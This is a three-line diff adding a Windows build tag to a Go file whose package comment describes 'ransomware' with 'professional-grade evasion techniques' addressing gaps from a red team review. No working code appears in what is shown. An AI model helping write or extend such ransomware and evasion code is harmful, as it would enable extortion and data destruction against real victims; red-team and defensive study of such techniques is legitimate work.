@@ -1,3 +1,5 @@
+//go:build windows
+
 // Package ransomware — professional-grade evasion techniques.
 //
 // Implementations that address the gaps identified by red team review:
